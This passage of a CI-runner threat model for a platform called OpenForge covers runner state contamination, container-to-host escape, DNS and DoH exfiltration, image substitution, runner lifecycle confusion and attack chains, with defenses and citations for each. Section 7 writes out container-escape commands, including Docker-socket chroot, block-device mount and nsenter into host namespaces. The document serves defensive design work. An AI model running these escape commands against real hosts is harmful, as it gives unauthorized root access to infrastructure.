State contamination is a persistence mechanism: a compromised job can leave a backdoor that executes during the next job on the same runner. The threat model must treat every persistent runner as potentially compromised after every job, and the only safe state is "freshly provisioned." The cost of ephemeral runners (cold start latency, per-job provisioning cost) is a security tax that must be paid. For workloads that require persistent state (GPU, large caches), the state must be explicitly declared, verified, and scoped — not implicitly inherited from the previous job. The runner controller must be able to attest that a runner is in a known-good state before scheduling a job on it.

**Citations.**
- GitLab "Security for self-managed runners": https://docs.gitlab.com/runner/security/
- Barret Blake "Your PC Is a Build Agent: Part 2": https://barretblake.dev/posts/development/2026/09/self-hosted-part-2/
- Safeguard "What hidden state does a long-lived CI agent hold that you don't want it to": https://safeguard.sh/resources/blog/what-hidden-state-does-a-long-lived-ci-agent-hold
- runs-on.com "Ephemeral vs long-lived runners": https://runs-on.com/blog/ephemeral-vs-long-lived-runners/
- Tongtech "Shared Runner Security and Hygiene": https://tongtech.net/docs/guides/shared-runner-security-and-hygiene/
- Systems Hardening "Securing CI/CD Runners: Isolation, Credential Scoping, and Ephemeral Environments": https://www.systemshardening.com/articles/cicd/securing-cicd-runners/
- EPAR (ephemeral-action-runner) security documentation: https://github.com/solutionforest/ephemeral-action-runner/blob/main/docs/security.md

---

## 7. Host Filesystem Escape via Mount, Bind Mount, or Volume

**Problem description.**
A container that is given access to a host path — via `--privileged`, a bind mount, a Docker socket, or a host namespace — can read and write host files. This is not a vulnerability in the container runtime; it is the intended behavior of the mount mechanism. The security boundary is the mount specification, and if the specification is wrong, the boundary is gone. This is hard to defend against because the dangerous mounts are often in the infrastructure layer (Kubernetes manifests, Docker Compose files, Helm charts) rather than in the application code, and dependency scanners do not inspect infrastructure-as-code for mount specifications. A `hostPath: /` mount in a Kubernetes pod spec, a `-v /:/host` in a Docker Compose file, or a `/var/run/docker.sock` mount in a Jenkins agent image are all silent, undetectable by SAST/DAST tools, and immediately exploitable once the container is compromised. The Elastic Security rule for "Privileged Container Creation with Host Directory Mount" is a detection rule, not a prevention control — it fires after the escape has already happened.

The specific escape paths, ordered by ease of exploitation:

1. **Docker socket mount (trivial).** `docker run -v /:/host -it alpine chroot /host sh` from inside a container with the socket mounted. No exploit required. The socket is a documented behavior, not a bug.

2. **Privileged container (easy).** With `--privileged`, host block devices are visible. `fdisk -l` to enumerate disks, `mount /dev/sda1 /mnt`, `chroot /mnt` for full host root. Alternatively, `nsenter -t 1 -m -u -n -i sh` to enter the host's namespaces.

3. **Dangerous capabilities (moderate).** `CAP_SYS_ADMIN` enables cgroup-based escape. `CAP_SYS_PTRACE` enables process injection. `CAP_NET_ADMIN` enables network namespace manipulation. These are granted by `--privileged` but can also be granted individually via `--cap-add`.

4. **Host path volume mounts (situational).** `-v /etc:/etc` gives access to host configuration. `-v /proc:/host-proc` gives access to host process information. `-v /var/lib/docker:/docker` gives access to the Docker data directory, including image layers and container state.

5. **Kernel exploit (difficult).** Requires an unpatched vulnerability in the kernel's namespace or cgroup implementation. The primary defense is patching the host kernel. CVE-2022-0492 (cgroups v1 `release_agent`) was achievable from an unprivileged container in certain configurations because the capability check was missing.

**Real-world examples.**
- **Docker socket mount escape** (documented behavior, no CVE): `docker run -v /:/host --privileged -it alpine chroot /host sh` from inside a container with the Docker socket mounted gives interactive root on the host. This pattern appears in CI/CD pipelines that do Docker-in-Docker and in observability agents that need to inspect sibling containers. It is "a known-enough pattern that it's been a staple of container CTF challenges since 2019, yet socket-mounting continues to appear in production Helm charts and Jenkins agent images."
- **Elastic Security rule "Privileged Container Creation with Host Directory Mount"**: A detection rule that flags privileged containers that bind-mount host directories. The rule's response guidance is immediate: "stop and remove the privileged container, cordon the node, temporarily disable the Docker/CRI socket to block further privileged runs, preserve forensic artifacts, and rotate credentials potentially exposed by the host mount."
- **CVE-2024-21626** (see Section 1): A file-descriptor leak in runc allowed a container process to have a working directory on the host filesystem. The fix required four separate patches: checking `getcwd()` returns `ENOENT` for paths outside the container rootfs, closing all internal file descriptors before `execve`, fixing specific fd leaks, and marking all non-stdio files as `O_CLOEXEC` before executing `runc init`.
- **Yunolay container escape guide (December 2025)**: Documents the full escape chain: Docker socket mount (trivial), privileged container with block device mount (easy), `CAP_SYS_ADMIN` with cgroup access (moderate), host path volume mounts (situational), kernel exploit (difficult). Notes that CVE-2022-0492 (cgroups v1 `release_agent`) was achievable from an unprivileged container in certain configurations because the capability check was missing.

**Current best-practice defense.**
- Never mount `/var/run/docker.sock`, `/`, or any host system path into untrusted job containers.
- Use a read-only root filesystem for all job containers.
- Apply Pod Security Standards (K8s) or equivalent admission policies to deny `--privileged`, `hostPath: /`, `hostPID: true`, and `hostNetwork: true` for all untrusted workloads.
- Use a rootless container runtime (rootless Docker, Podman with user namespaces) so that even a successful escape lands as an unprivileged user.
- For OpenForge: the runner infrastructure must use a microVM boundary (Firecracker, gVisor, or Kata containers) for all untrusted jobs. The microVM must not have access to the host filesystem, the Docker socket, or host devices. The only allowed host-to-container channels are: the job's source code (read-only bind mount of a tmpfs), the job's output directory (writable, destroyed after the job), and the network (restricted egress only).

**Threat model implications.**
Host filesystem access is not a vulnerability to be patched — it is a capability to be denied. The threat model must enumerate every host path that a job container can access and deny everything that is not explicitly required. The default must be "no host access," not "host access with restrictions." The microVM boundary is the strongest defense because it does not share the host kernel, so a kernel vulnerability in the host does not directly compromise the guest. Additionally, the microVM's device model is minimal (no USB, no PCI passthrough, no host devices), which eliminates an entire class of escape vectors.

**Citations.**
- Maxuru "Docker container escape" (docker socket, privileged, docker group): https://maxuru.com/docker/container-escape/
- Yunolay "Breaking Out: A Practical Guide to Linux Container Escape Techniques": https://yunolay.com/container-escape/
- Yunolay "Privilege Escalation via the Docker Group: From User to Root": https://yunolay.com/docker-group-privesc/
- Elastic Security rule "Privileged Container Creation with Host Directory Mount": https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/cross-platform/execution_privileged_container_creation_with_host_reference
- Safeguard "Container Escape Attacks: How They Happen & Prevention": https://safeguard.sh/resources/blog/container-escape-attacks-how-they-happen-and-how-to-prevent-them
- Docker docs "Bind mounts" (security considerations): https://docs.docker.com/engine/storage/bind-mounts/
- Intramweb "Docker Container Escape Risks: Attack Paths and Defences": https://www.intramweb.com/docker-containers/docker-container-escape-risks/
- OWASP "Docker Security Cheat Sheet": https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html

---

## 8. Network Egress Exfiltration

**Problem description.**
A compromised CI runner needs an outbound channel to exfiltrate secrets, source code, or other sensitive data. The most reliable channel is DNS, because DNS traffic is typically allowed to pass through enterprise firewalls without deep inspection or state maintenance. Attackers encode data in DNS subdomain labels (DNS tunneling), use DNS-over-HTTPS (DoH) to encrypt the tunnel, or use DNS-over-TCP to bypass UDP-only inspection. This is hard to defend against because DNS is required for normal operation — a build job needs to resolve package registry hostnames, and blocking all DNS kills the build. Naive defenses like "we block outbound traffic to unknown domains" fail because the attacker can use a legitimate DoH provider (dns.google, cloudflare-dns.com, doh.opendns.com) as the exfiltration channel; the traffic looks identical to a normal HTTPS request to a well-known domain. The Harden-Runner CVE-2026-32946/32947 pair demonstrated that even a purpose-built egress filtering system for CI runners can be bypassed via DNS-over-TCP and DoH, because the filter only inspected DNS-over-UDP.

The fundamental problem is that DNS is a protocol that is simultaneously required for normal operation and inherently suited to covert communication. A DNS query is a single UDP packet (53 bytes header + variable payload) that is sent to a well-known port (53) and is typically allowed through firewalls because blocking it breaks name resolution. The attacker can encode up to ~255 characters of data in a single DNS subdomain label, and can send hundreds of queries per second without triggering rate limits. The data rate is low (kilobytes per second at most), but it is sufficient to exfiltrate a few hundred secrets over the lifetime of a build job.

DNS-over-HTTPS makes the problem significantly harder to detect. DoH encapsulates DNS queries inside HTTPS, so the traffic looks identical to any other HTTPS request to a well-known domain (dns.google, cloudflare-dns.com, etc.). A firewall that allows HTTPS to these domains — which it must, because many legitimate services use DoH — cannot distinguish a normal DoH query from a data exfiltration query without decrypting the TLS session, which is not feasible at scale. The academic literature (Liu et al. 2022, Elaoumari 2025) demonstrates that detection is possible using TLS fingerprints and flow-based features, but the evasion cost for the attacker is non-trivial and the detection rate is not 100%. The practical defense is to prevent the runner from using DoH at all: restrict DNS to the internal resolver, which does not support DoH, and block outbound HTTPS to known DoH provider domains.

**Real-world examples.**
- **CVE-2026-32946 / CVE-2026-32947 (Harden-Runner, 2026)**: Two vulnerabilities in StepSecurity's Harden-Runner (an egress filtering tool for GitHub Actions runners) that allowed attackers with existing code execution to bypass enforced egress network restrictions. CVE-2026-32946: DNS queries over TCP to external resolvers bypassed the UDP-only filter. CVE-2026-32947: DNS-over-HTTPS to permitted DNS resolver services (dns.google, cloudflare-dns.com, doh.opendns.com) allowed covert data exfiltration even when only whitelisted endpoints were allowed. Both had CVSS 4.6. Fixed in Harden-Runner 2.16.0.
- **UNSW "Detecting Data Exfiltration from Internal Hosts" (TNSM 2019)**: The canonical academic reference. Evaluated a real-time mechanism for detecting exfiltration and tunneling of data over DNS on live 10 Gbps traffic streams from two organizations. Injected more than 3 million malicious DNS queries generated by two exfiltration tools and demonstrated high-accuracy detection. Key finding: DNS traffic is "usually allowed to pass through enterprise firewalls without deep inspection or state maintenance, thereby providing a covert channel for attackers to encode low volumes of data without fear of detection."
- **Salat, Davis, Khan "DNS Tunnelling, Exfiltration and Detection over Cloud Environments" (Sensors 2022)**: Demonstrated successful DNS tunneling (Iodine, DNScat2) in GCP and AWS environments, including a case where the cloud firewall was blocking all outbound egress traffic — the DNS tunnel still worked because DNS resolution via the metadata server was not blocked.
- **Liu et al. "Detecting DNS over HTTPS based data exfiltration" (Computers & Security 2022)**: Proposed a method to detect DoH-based data exfiltration using TLS fingerprints and flow-based features. Key finding: "it is very difficult to evade detection due to the difficulty of feature imitation" but "the transmission rate of the DoH tunnel will be very low" if the attacker evades.

**Current best-practice defense.**
- Restrict DNS to a single internal resolver that the runner controls. Do not allow the runner to query external resolvers directly.
- Block all outbound traffic except to explicitly allowed endpoints (package registries, container registries, artifact storage).
- Monitor DNS query patterns for anomalies: high query volume, unusually long subdomain labels, high Shannon entropy in hostnames, unusual record types (TXT, CNAME chains).
- Use eBPF or network namespace isolation to enforce egress restrictions at the kernel level, not just at the firewall level.
- For OpenForge: implement a network policy that allows only: (a) DNS to the internal resolver, (b) HTTPS to explicitly allowlisted package registries, (c) HTTPS to the OpenForge API. All other outbound traffic is blocked and logged. Additionally, implement DNS query monitoring that flags queries with subdomain labels >64 characters or with Shannon entropy >4.5 bits/character.

**Threat model implications.**
Network egress is the exfiltration channel that completes every other attack in this document. Without egress, a compromised runner cannot exfiltrate secrets, cannot beacon to a C2 server, and cannot download additional payloads. The threat model must treat network egress as the primary exfiltration vector and design the network policy to minimize it. The key insight is that DNS is both required (for package resolution) and dangerous (for tunneling), so the defense must allow DNS to the internal resolver while blocking DNS to external resolvers. The internal resolver can then apply anomaly detection to the queries it handles, without requiring deep packet inspection of outbound traffic.

**Citations.**
- SentinelOne "CVE-2026-32947: Harden-Runner Auth Bypass Vulnerability" (DoH exfiltration): https://www.sentinelone.com/vulnerability-database/cve-2026-32947/
- SentinelOne "CVE-2026-32946: Harden-Runner Auth Bypass Vulnerability" (DNS-over-TCP): https://www.sentinelone.com/vulnerability-database/cve-2026-32946/
- Eventus Security "Harden Runner Vulnerabilities in CI/CD Pipelines Leveraged Through DNS Channels": https://advisory.eventussecurity.com/advisory/harden-runner-vulnerabilities-in-ci-cd-pipelines-leveraged-through-dns-channels/
- UNSW "Detecting Data Exfiltration from Internal Hosts" (TNSM 2019): https://www2.ee.unsw.edu.au/~hhabibi/pubs/jrnl/19TNSM_dnsExfil.pdf
- UNSW "Real-Time Detection of DNS Exfiltration" (IM 2019): https://www2.ee.unsw.edu.au/~hhabibi/pubs/conf/19im.pdf
- Salat, Davis, Khan "DNS Tunnelling, Exfiltration and Detection over Cloud Environments" (Sensors 2022): https://www.mdpi.com/1424-8220/23/5/2760
- Liu et al. "Detecting DNS over HTTPS based data exfiltration" (Computers & Security 2022): https://www.sciencedirect.com/science/article/abs/pii/S1389128622001104
- Elaoumari "Evasion-Resilient Detection of DNS-over-HTTPS Data Exfiltration" (arXiv 2025): https://arxiv.org/pdf/2512.20423.pdf

---

## 9. Registry and Image Substitution

**Problem description.**
A CI pipeline that pulls a container image by tag is trusting the registry to return the image the tag points to. Tags are mutable: they are pointers, not content hashes. An attacker who has push access to a registry can re-point a tag to a different image, and every pipeline that pulls by tag will silently receive the substituted image. This is a TOCTOU (time-of-check vs. time-of-use) problem: the image that was scanned and approved during CI setup is not the image that is pulled at build time. Digest pinning (`image@sha256:...`) addresses the mutability problem but not the trust problem: a pinned digest guarantees you pull the same bytes every time, but it does not tell you whether those bytes were built by a trusted party from a known source. The Trivy incident demonstrated that a stolen push token is sufficient to overwrite trusted image tags on a public registry, and that a vulnerability scanner examining the compromised image would have no reason to flag it. Additionally, CVE-2026-85747 demonstrated that even the registry client itself can be compromised: the Distribution library's `manifests.Get()` function reads a manifest by digest but never hashes the returned body and compares it against the requested digest, meaning a malicious or compromised registry can serve arbitrary manifest bytes in response to a digest-pinned request.

The typosquatting problem is a separate but related vector. The USENIX Security 2022 study (Liu et al.) demonstrated that container registries are vulnerable to typosquatting attacks in three scenarios: (1) public registries, where an attacker registers a username that is a one-character variation of a popular username and uploads a malicious image with the same name; (2) private registries, where the naming space is open and an attacker can register a project ID that is similar to a legitimate one; and (3) cross-registry typosquatting, where a user mistypes the registry hostname and is directed to an attacker-controlled registry hosting a malicious image with the same name. The study's 210-day proof-of-concept on Docker Hub showed that typosquatting images attracted more than 40,000 pull counts, and that Docker Hub only removed one user's typosquatting images after 105 days. The practical defense is to pin images by full qualified name (registry hostname + username + image name + digest) and to verify that the registry hostname matches the expected value exactly.

The Moby ambiguous OCI manifest parsing vulnerability (GHSA-xmmx-7jpf-fx42, 2024) added another layer: even if the digest is correct, the manifest content can be interpreted differently depending on the `Content-Type` HTTP header, which is under the registry's control. A registry that serves the same digest with different `Content-Type` headers on different requests can cause the client to interpret the manifest differently, potentially leading to execution of unintended content. This was fixed in Moby 20.10.11 by rejecting manifests that contain a `manifests` field or indices that contain a `layers` field, but it highlights the fundamental problem: the registry is a trusted party in the image pull path, and any compromise of that trust (credential theft, DNS hijack, TLS MITM, or a bug in the registry software) can lead to image substitution.

**Real-world examples.**
- **Sysdig "Attack of the mutant tags! Or why tag mutability is a real security threat" (June 2020)**: The canonical reference on tag mutability as a security problem. Demonstrated that a developer with registry access can mutate a tag after the image has been scanned, getting a malicious version running in production. The article established the TOCTOU framing: "The image that is verified during the CI/CD pipeline or the Kubernetes admission phase differs from the image that is deployed in the cluster, bypassing image scanning security checks."
- **Trivy supply chain compromise (March 2026)**: Aqua Security's publishing credentials were stolen. The `latest`, `0.69.4`, `0.69.5`, and `0.69.6` tags on Docker Hub were silently re-pointed to malicious images. Docker's post-mortem explicitly states: "Mutable tags are not a security boundary. OCI image tags including `latest` are mutable pointers that can be overwritten by anyone with push access."
- **CVE-2026-85747 (Distribution library, 2026)**: The `registry/client.(*manifests).Get()` function in the Distribution library (used by Docker, containerd, and most OCI tooling) reads a manifest by digest but never verifies that the returned bytes hash to the requested digest. A malicious or compromised registry can serve arbitrary manifest content in response to a digest-pinned request, and the client accepts it. The bundled pull-through proxy caches and re-serves the poisoned manifest to all downstream clients. Fixed in Distribution 3.1.2.
- **USENIX Security 2022 "Exploring the Uncharched Space of Container Registry Typosquatting" (Liu et al.)**: The first in-depth study of container registry typosquatting. Conducted a 210-day proof-of-concept on Docker Hub and Quay.io, uploading ~4,000 typosquatting images targeting 10 usernames. The typosquatting images attracted more than 40,000 pull counts. Only one user's typosquatting images were deleted by Docker Hub, and only on day 105. The paper also demonstrated typosquatting across registries: a user who mistypes the hostname field can be directed to an attacker-controlled registry hosting a malicious image with the same name.
- **Moby Ambiguous OCI Manifest Parsing (GHSA-xmmx-7jpf-fx42, 2024)**: Moby (Docker Engine) prior to 20.10.11 treated the `Content-Type` header as trusted when parsing OCI manifests. If the header changed between pulls of the same digest, the document could be interpreted differently, meaning the digest alone was insufficient to unambiguously identify the content of the image.

**Current best-practice defense.**
- Pin all images by content digest (`image@sha256:...`), not by tag.
- Verify signed provenance attestations (SLSA, Sigstore) for all images that run with elevated permissions. A pinned digest is necessary but not sufficient.
- Use a private registry mirror that verifies upstream signatures before caching. The mirror is the trust boundary; the upstream registry is not.
- Implement registry access control: only the build pipeline has pull access; only the CI system has push access. No human has direct registry credentials.
- For OpenForge: implement a private registry mirror that enforces signature verification on all inbound images. The mirror rejects any image without a valid signature from a trusted key. Additionally, the runner must verify the image digest at pull time and refuse to start a container if the digest does not match the workflow's declaration. Implement a typosquatting check: before pulling an image, verify that the registry hostname and image name match the expected value exactly (no fuzzy matching, no DNS-based registry resolution for untrusted workflows).

**Threat model implications.**
Image substitution is a supply chain attack that targets the CI system's own trust in its build inputs. The threat model must treat the container registry as an untrusted input channel, just like the package registry or the source code repository. The defense is verification at the point of use: the runner must verify that the image it is about to run is the image the workflow declared, built by the party the workflow trusts, from the source the workflow expects. This requires three independent checks: (a) digest match (content integrity), (b) signature verification (provenance), and (c) registry identity check (typosquatting prevention). Any one of these alone is insufficient.

**Citations.**
- Sysdig "Attack of the mutant tags! Or why tag mutability is a real security threat": https://www.sysdig.com/blog/toctou-tag-mutability
- Docker blog "Trivy supply chain compromise: What Docker Hub users should know": https://www.docker.com/blog/trivy-supply-chain-compromise-what-docker-hub-users-should-know/
- Docker blog "Trivy, KICS, and the shape of supply chain attacks so far in 2026": https://www.docker.com/blog/trivy-kics-and-the-shape-of-supply-chain-attacks-so-far-in-2026/
- SentinelOne "CVE-2026-85747: Container Registry Manifest RCE Vulnerability": https://www.sentinelone.com/vulnerability-database/cve-2026-85747/
- Docker Scout "CVE-2026-85747" (full technical details): https://scout.docker.com/vulnerabilities/id/CVE-2026-85747
- USENIX Security 2022 "Exploring the Unchartered Space of Container Registry Typosquatting" (Liu et al.): https://www.usenix.org/system/files/sec22-liu-guannan.pdf
- OSV "Moby Ambiguous OCI manifest parsing" (GHSA-xmmx-7jpf-fx42): https://osv.dev/vulnerability/GHSA-xmmx-7jpf-fx42

---

## 10. Ephemeral vs. Persistent Runner Confusion

**Problem description.**
The "ephemeral runner" model — where each job runs on a freshly provisioned machine that is destroyed after the job completes — is the security-correct default. In practice, runners are persistent because of operational convenience: persistent runners are faster (no cold start), cheaper (no per-job provisioning cost), and support features that require local state (GPU access, large local caches, specific network topology). The confusion arises when the platform presents a persistent runner as if it were ephemeral: the user sees "a clean runner" in the UI, but the filesystem, credential files, and process table carry state from the previous job. This is hard to defend against because the confusion is in the model, not in the code. The platform's documentation may say "each job runs in an isolated environment" while the actual runner is a long-lived VM with a persistent disk. Naive defenses like "we document that runners are persistent" fail because the user who wrote the workflow assumed a clean VM and wrote `docker login` in a step, leaving Docker credentials in `~/.docker/config.json` that the next job can read. The GitLab runner security documentation is explicit about the risk: "Any user that has the Developer role for the project's repository could compromise the security of the environment hosting the runner, whether intentional or not. This risk is even more acute if your self-managed runners are non-ephemeral and used for multiple projects." GitHub's own guidance recommends ephemeral autoscaling for self-hosted runners and warns that "forks of your public repository can potentially run dangerous code on your self-hosted runner machine by creating a pull request that executes the code in a workflow."

The operational consequences of the confusion are well-documented:

- **Flaky tests.** A test that passes on one runner and fails on another, because the second runner has stale state from a previous job. The failure is non-deterministic and hard to reproduce.

- **Leaked credentials.** A job that runs `docker login` leaves `~/.docker/config.json` on the runner. The next job — possibly from a different repository or a different user — can read the Docker credentials and push malicious images to the registry.

- **Port conflicts.** A test suite that spins up Postgres on port 5432 and doesn't tear it down leaves the process running. The next job that tries to start Postgres on port 5432 gets "port already in use" and fails.

- **Resource drift.** Disks fill with Docker images and build artifacts until jobs fail with `ENOSPC`. Memory fragments. A runner that behaved like a fresh machine on Monday is swapping and OOM-killing by Friday — and the failure looks random because it depends on how many jobs happened to land there first.

- **Silent failures.** An ephemeral runner that does not clean up the previous registration file (`.runner`) silently fails: the runner starts, looks healthy, but no job ever comes because the registration token was deleted 20 minutes ago. The failure is invisible in the logs because the runner is not crashing — it is just waiting for a job that will never come.

The fundamental problem is that the ephemeral model is a security property that must be enforced by the platform, not a convenience that the user can opt into. If the platform's security guarantee is "each job runs in a clean environment," the platform must ensure that guarantee holds, regardless of the user's workflow. The user should not have to know whether their runner is ephemeral or persistent; the platform should make the security guarantee hold in both cases.

**Real-world examples.**
- **GitLab runner security documentation**: Documents the risk model explicitly and recommends ephemeral runners for privileged workloads. Notes that "Docker can be considered safe when running in non-privileged mode" but "privileged containers in Docker have all the root capabilities of the host VM" and "running the container in the host PID namespace breaks container isolation and is unsafe."
- **runs-on.com "Ephemeral vs long-lived runners" (2026)**: Documents the operational consequences of the confusion: "A runner is a machine with a filesystem, a process table, a network namespace, and a set of credentials. A long-lived runner carries all of that from one job to the next." Documents specific failure modes: poisoned cache entries inherited by subsequent jobs, credentials left in `~/.docker/config.json` or `~/.ssh/`, orphaned processes holding ports, and resource drift (disks filling with images and build artifacts until jobs fail with `ENOSPC`).
- **Safeguard "What hidden state does a long-lived CI agent hold?" (October 2026)**: Documents the five categories of hidden state and the migration path. Notes that "Ephemeral cleanup alone is not a sandbox boundary" — the ephemeral model reduces risk but does not eliminate it, because a workflow that runs during the job can still access any secrets and reachable services exposed to it.
- **EPAR (ephemeral-action-runner) security documentation**: Explicitly documents what ephemeral runners do and do not guarantee: "A workflow controls its runner environment while it runs and can access any secrets and reachable services exposed to that workflow. Ephemeral cleanup alone is not a sandbox boundary."

**Current best-practice defense.**
- Default to ephemeral runners. Persistent runners must be an explicit opt-in with a security review and a documented justification.
- If persistent runners are used, implement a strict state audit before each job: verify no processes from previous jobs are running, verify no credential files exist in home directories, verify the workspace is empty.
- Use a versioned runner image (built from a Dockerfile) so that the toolchain is reproducible and any modification to the filesystem is detectable.
- Inject per-job credentials that expire when the job ends. Never store long-lived credentials on the runner.
- For OpenForge: the runner controller must track the runner's lifecycle state explicitly. A runner that has run an untrusted job must be destroyed and replaced before it can run another job. The controller must refuse to schedule a job on a runner whose state cannot be verified as clean. Additionally, implement a "runner attestation" mechanism: the runner reports its filesystem hash and process list to the controller before starting a job, and the controller verifies the hash against the expected value for the runner image.

**Threat model implications.**
The ephemeral-vs-persistent confusion is a model integrity problem: the platform's security guarantee ("each job runs in a clean environment") must match the platform's actual behavior. If the platform promises ephemeral isolation but delivers a persistent runner with stale state, the security guarantee is false and every threat in this document is amplified. The threat model must treat the runner's lifecycle state as a first-class security property: the runner is either "clean" (freshly provisioned from a verified image) or "dirty" (has run at least one job since provisioning), and only clean runners can be scheduled for untrusted workloads. The runner controller must enforce this invariant, and the runner must be able to prove its state (via attestation) rather than the controller having to trust the runner's self-report.

**Citations.**
- GitLab "Security for self-managed runners": https://docs.gitlab.com/runner/security/
- runs-on.com "Ephemeral vs long-lived runners": https://runs-on.com/blog/ephemeral-vs-long-lived-runners/
- Safeguard "What hidden state does a long-lived CI agent hold that you don't want it to": https://safeguard.sh/resources/blog/what-hidden-state-does-a-long-lived-ci-agent-hold
- EPAR security documentation: https://github.com/solutionforest/ephemeral-action-runner/blob/main/docs/security.md
- Systems Hardening "Securing CI/CD Runners: Isolation, Credential Scoping, and Ephemeral Environments": https://www.systemshardening.com/articles/cicd/securing-cicd-runners/
- Tongtech "Shared Runner Security and Hygiene": https://tongtech.net/docs/guides/shared-runner-security-and-hygiene/
- GitHub docs "Compromised runners" (self-hosted runner risk): https://docs.github.com/en/actions/concepts/security/compromised-runners

---

## 11. What We Are NOT Covering

The following categories are deliberately excluded from this document, with reasons:

**a) Denial-of-service and resource exhaustion.**
CI runners are inherently exposed to DoS: a job can consume all CPU, all memory, all disk, or all network bandwidth. While this is a real operational concern, it is not a security boundary violation in the same sense as the other ten categories. The defense is resource limits (cgroups, K8s resource requests/limits), which are well-understood and not novel. The threat model for DoS is different: the attacker does not need to escape the sandbox or exfiltrate secrets; they just need to make the runner unavailable. This is an availability problem, not a confidentiality or integrity problem, and is better addressed in the operational runbook than in the threat model.

**b) Insider threats and social engineering of CI maintainers.**
The tj-actions incident was ultimately a social engineering / credential theft problem: the attacker compromised a PAT belonging to the `@tj-actions-bot` account. The KICS and Trivy incidents were also credential theft. While credential hygiene is important, the specific mechanics of how an attacker obtains a human's credentials (phishing, keylogging, physical access) are outside the scope of a CI runner threat model. The CI runner's job is to assume that credentials may be compromised and to minimize the blast radius (short-lived tokens, per-job scoping, no long-lived secrets on the runner). The defense against the credential theft itself is an identity and access management problem, not a CI runner problem.

**c) Malicious code in the user's own application (intentional backdoors).**
If a user deliberately embeds a backdoor in their own source code and uses the CI runner to deploy it, the CI runner is doing exactly what it was told to do. The CI runner is not responsible for the intent of the code it executes. This is outside the threat model: the threat model assumes the attacker is an external party trying to compromise the CI system, not a user trying to use the CI system to do something they should not. The exception is when a user's malicious code escapes the intended scope (e.g., a job that is supposed to build a web app instead starts a crypto miner) — but that is a policy enforcement problem, not a security boundary problem, and is addressed by network egress restrictions and resource limits rather than by sandbox isolation.

**d) Compliance and audit requirements.**
SOC 2, ISO 27001, and similar compliance frameworks impose logging, access control, and audit trail requirements on CI systems. While these are important for enterprise customers, they are not security threats in the same sense as the ten categories above. Compliance is a constraint on the design (what logging must be kept, what access controls must exist), not a threat that the design must defend against. The security threat model and the compliance model are separate concerns that must be reconciled during design, but compliance does not introduce new attack vectors.

---

## 12. Cross-Section Dependencies

The ten failure modes in this document are not independent. They compose into attack chains, and the defense against one failure mode often depends on the defense against another. Understanding these dependencies is essential for the OpenForge threat model.

**Chain 1: Pwn request → Cache poisoning → Release compromise (Sections 5 → 2 → 4)**
The TanStack incident (May 2026) is the canonical example. A pwn request (Section 5) provides initial code execution in the base repository context. That code execution is used to write a poisoned cache entry (Section 2). The release pipeline restores the poisoned cache and executes the attacker's code with publish secrets (Section 4). The defense against this chain requires all three sections to be defended simultaneously: the pwn request must be blocked (no untrusted code in base context), the cache must be write-protected for untrusted workflows (no cache poisoning), and the release pipeline must verify cache contents before use (no blind cache restore).

**Chain 2: Supply chain compromise → Secret leakage → Exfiltration (Sections 4 → 3 → 8)**
The tj-actions/changed-files incident (March 2025) demonstrates this chain. A compromised action (Section 4) dumps runner memory and prints secrets to the log (Section 3). In a public repository, the log is publicly accessible, so no network exfiltration is needed. In a private repository, the attacker would need network egress to exfiltrate the secrets (Section 8). The defense requires: signed action registry (Section 4), log sanitization (Section 3), and restricted egress (Section 8).

**Chain 3: Sandbox escape → Host compromise → Full infrastructure takeover (Sections 1 → 7 → 6)**
A sandbox escape (Section 1) gives the attacker root on the host. The attacker then has access to all host filesystem paths (Section 7), including credential files, Docker configuration, and the Docker socket. The attacker can then compromise other containers on the host, leaving persistent backdoors that survive the original job's completion (Section 6). The defense requires: microVM boundary (Section 1), no host filesystem access (Section 7), and ephemeral runners (Section 6).

**Chain 4: Image substitution → Sandbox escape → Exfiltration (Sections 9 → 1 → 8)**
A substituted container image (Section 9) may contain an exploit for the container runtime (Section 1). If the exploit succeeds, the attacker has host access and can exfiltrate secrets via network egress (Section 8). The defense requires: image signature verification (Section 9), microVM boundary (Section 1), and restricted egress (Section 8).

**Chain 5: Runner reuse → State contamination → Cache poisoning (Sections 6 → 2)**
A persistent runner (Section 6) that has run a compromised job may have a poisoned cache entry on its local disk. The next job on the same runner restores the poisoned cache (Section 2). The defense requires: ephemeral runners (Section 6) and cache content verification (Section 2).

**Implication for OpenForge design:**
The day-1 defenses must be designed as a coherent system, not as ten independent features. The microVM boundary (Section 1) is the foundation: it limits the blast radius of every other failure mode. The ephemeral runner model (Section 6, 10) is the second foundation: it prevents persistence. The signed action registry (Section 4) and image signature verification (Section 9) are the trust anchors: they provide the provenance guarantees that the other defenses rely on. The restricted egress policy (Section 8) is the last line of defense: even if all other defenses fail, the attacker cannot exfiltrate data without an outbound channel.

**Design priority ordering for OpenForge:**

1. **MicroVM boundary** (Section 1, 7) — Highest priority. Without this, every other defense is weakened because a sandbox escape compromises the entire host. Firecracker or gVisor must be the default isolation mechanism for untrusted jobs. This is not negotiable.

2. **Ephemeral runner model** (Section 6, 10) — Second highest priority. Every job must run on a freshly provisioned runner that is destroyed after the job completes. This eliminates the entire class of state contamination attacks and makes the runner's security state provably clean before each job.

3. **Restricted egress policy** (Section 8) — Third priority. The network policy must be implemented at the kernel level (eBPF, network namespaces, or microVM network policy) rather than at the firewall level. The default must be "no outbound traffic" with explicit allowlist exceptions.

4. **Signed action registry** (Section 4) — Fourth priority. The action registry must verify signatures at execution time. Actions that fail signature verification must be refused, not warned about. The registry must be private (mirrored from upstream) so that the OpenForge platform controls which actions are available.

5. **Image signature verification** (Section 9) — Fifth priority. The private registry mirror must verify signatures on all inbound images. The runner must verify the image digest at pull time. Typosquatting checks must be enforced at the registry level.

6. **Workflow engine trust separation** (Section 5) — Sixth priority. The workflow engine must architecturally enforce the separation between base-repo context and fork context. This is a design constraint on the workflow engine, not a runtime check. The engine must refuse to schedule a job that combines base-repo secrets with fork-origin code.

7. **Cache trust-level partitioning** (Section 2) — Seventh priority. The cache service must partition the key space by trust level. Untrusted workflows must have read-only access to the cache. The cache key must include a trust boundary identifier that the cache service enforces server-side.

8. **Log sanitization pipeline** (Section 3) — Eighth priority. The log ingestion pipeline must sanitize output before storage. The sanitizer must detect high-entropy strings, known credential patterns, and base64-encoded blocks. The log store must be access-controlled with short retention for untrusted workflows.

9. **Runner attestation** (Section 6, 10) — Ninth priority. The runner must report its filesystem hash and process list to the controller before starting a job. The controller must verify the hash against the expected value for the runner image. This provides a tamper-evident record of the runner's state.

